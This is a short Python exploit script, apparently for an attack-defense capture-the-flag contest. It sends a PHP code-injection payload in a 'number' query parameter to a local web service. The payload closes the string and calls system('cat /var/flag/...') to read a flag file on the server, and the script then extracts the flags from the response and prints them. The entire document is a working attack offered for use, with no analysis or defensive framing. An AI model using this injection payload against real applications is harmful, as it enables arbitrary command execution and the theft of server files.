#!/usr/bin/python3

import requests
import random
import string
import json
import threading
from termcolor import colored
from utilities import extract_flag, submit_flag

s = requests.Session()
host = '127.0.0.1'
port = 50000

url = lambda x: f'http://{host}:{port}' + x

def random_string(l):
    return ''.join(random.choice(string.ascii_letters) for i in range(l))

def exploit():
	r = s.get(url("/index.php?number=1'; system('cat /var/flag/00000000000000000000000000000000'); //"), timeout=4)
	
	return r.text

def test():
	try:
		host = '127.0.0.1'
		team_name = "x0rry"
		print(colored(f'[EXPLOIT] Exploiting team {team_name} at {url("/")}', 'magenta', attrs=["bold"]))

		x = exploit()

		flags = extract_flag(x)

		for flag in flags:
			print(colored(f'	[FLAG] {flag}', 'green', attrs=["bold"]))

	except Exception:
		print(colored(f'Failed for {team_name}', 'red', attrs=["bold"]))

test()
